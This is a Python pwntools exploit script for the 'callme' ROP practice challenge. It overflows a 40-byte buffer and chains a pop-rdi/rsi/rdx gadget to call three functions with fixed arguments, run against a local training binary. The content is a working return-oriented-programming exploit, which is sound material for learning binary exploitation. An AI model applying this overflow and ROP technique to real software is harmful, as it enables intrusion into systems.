from pwn import *

context.arch = "amd64"

elf = context.binary = ELF("./callme")

CALLMES = [
    p64(elf.symbols.callme_one),
    p64(elf.symbols.callme_two),
    p64(elf.symbols.callme_three),
]

RDI = p64(0xdeadbeefdeadbeef)
RSI = p64(0xcafebabecafebabe)
RDX = p64(0xd00df00dd00df00d)

# pop rdi; pop rsi; pop rdx; ret
GADGET = p64(0x40093c)

payload = b'A' * 40

for i in range(3):
    # first ret to the gadget
    payload += GADGET
    # first pop rdi
    payload += RDI
    # then pop rsi
    payload += RSI
    # then pop rdx
    payload += RDX
    # then ret to the function
    payload += CALLMES[i]

conn = process("./callme")

conn.recvuntil(b'> ')
conn.send(payload)
recved = conn.recvall()

print(recved.decode("ascii"))
